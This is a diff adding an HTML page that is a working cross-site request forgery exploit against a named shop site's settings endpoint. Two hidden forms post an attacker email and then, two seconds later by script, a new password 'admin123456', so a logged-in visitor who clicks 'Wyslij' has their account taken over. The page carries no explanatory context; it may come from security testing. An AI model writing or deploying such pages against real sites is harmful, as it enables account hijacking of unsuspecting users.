@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body {
+            background-image: url("./image.gif");
+        }
+    </style>
+    </head>
+    <form action="http://goshop.paintballmod.com/?p=shopgo&t=ustawienia" method="post" target="_blank">
+        <input type="hidden" name="email" value="eteral@protonmail.com"/>
+        <input type="hidden" name="zapisz_ustawienia" value=""/>
+        <button type="submit">Wyslij</button>
+    </form>
+    <form action="http://goshop.paintballmod.com/?p=shopgo&t=ustawienia" method="post">
+        <input type="hidden" name="haslo" value="admin123456"/>
+        <input type="hidden" name="zapisz_Haslo" value=""/>
+    </form>
+<body>
+<script>
+    (async () => {
+        document.forms[0].addEventListener("submit", (e) => {
+            setTimeout(() => {
+                document.forms[1].submit();
+            }, 2000)
+            
+        })
+    })();
+</script>
+</body>
+</html>
